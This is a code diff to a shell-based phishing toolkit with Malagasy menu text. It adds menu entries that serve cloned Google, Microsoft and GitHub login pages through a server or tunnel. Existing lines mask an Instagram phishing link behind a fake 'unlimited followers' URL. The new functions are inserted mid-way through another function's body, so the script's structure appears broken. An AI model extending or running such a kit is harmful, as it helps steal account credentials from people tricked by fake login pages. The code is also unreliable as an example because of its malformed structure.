@@ -354,6 +354,21 @@ site_instagram() {
 ${RED}[${WHITE}01${RED}]${RED} Pejy fidirana mahazatra
 ${RED}[${WHITE}02${RED}]${RED} Pejy Auto Followers
 EOF
+site_google() {
+    site=".sites/google"
+    # Appel de la fonction de démarrage de ton serveur/tunnel (ex: start_server ou setup_site)
+    start_server 
+}
+
+site_microsoft() {
+    site=".sites/microsoft"
+    start_server
+}
+
+site_github() {
+    site=".sites/github"
+    start_server
+}
     read -p "${RED}[${WHITE}-${RED}]${GREEN} tsantaphis > ${BLUE}"
     case $REPLY in
         01) website="instagram"; mask="http://get-unlimited-followers-for-instagram"; tunnel_menu ;;
@@ -376,6 +391,9 @@ EOF
     case $REPLY in
         01) site_facebook ;;
         02) site_instagram ;;
+        03) site_google ;;
+        04) site_microsoft ;;
+        05) site_github ;;
         99) about ;;
         00) msg_exit ;;
         *) echo -e "\n${RED}[${WHITE}!${RED}]${RED} Safidy tsy manan-kery.${WHITE}"; sleep 1; main_menu ;;
